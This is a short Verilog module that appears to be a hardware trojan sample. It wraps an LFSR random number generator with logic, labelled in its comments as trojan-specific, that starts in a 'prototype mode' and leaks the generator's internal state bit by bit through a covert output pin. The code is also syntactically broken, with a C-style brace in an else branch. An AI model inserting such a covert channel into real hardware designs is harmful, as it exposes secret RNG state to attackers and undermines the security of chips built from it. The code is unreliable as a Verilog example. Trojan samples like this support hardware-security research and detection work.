module random_with_covert_channel (
    
    // Inputs
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_seed,
    input                       i_prototype_mode,  // Input indicating prototype mode

    // Outputs
    output reg          [7:0]  o_data,
    output reg                  o_covert_signal  // Covert channel output
);

    /******** Reg declarations ********/
    reg [31:0]  r_data;
    wire        w_xnor;

    /******** Trojan specific declarations ********/
    // Prototype phase covert channel activation condition
    reg [3:0]   bit_counter = 0; // Used for sequential bit transmission
    reg         transmit_flag = 0; // Flag to start transmission

    /******** Concurrent logic ********/
    assign w_xnor = (r_data[31] ^ ~r_data[29] ^ ~r_data[25] ^ ~r_data[24]);

    /******** Process ********/
    always @(posedge i_clk) begin
        if (!i_reset_n) begin
            r_data <= i_seed;
            bit_counter <= 0;
            transmit_flag <= 0; // Reset transmission flag on reset
        end else {
            // Normal RNG operation
            r_data <= {r_data[30:0], w_xnor};

            // Check if in prototype mode and if transmission should start
            if (i_prototype_mode && !transmit_flag) begin
                transmit_flag <= 1; // Start transmission in prototype mode
            end
            
            // If transmission flag is set, start leaking data bit by bit
            if (transmit_flag) begin
                o_covert_signal <= r_data[bit_counter]; // Leak bits sequentially
                bit_counter <= bit_counter + 1; // Move to the next bit
            end else begin
                o_covert_signal <= 0; // No data transmission
            end
        end
        // Assign the output data
        o_data <= r_data[7:0];
    end

endmodule
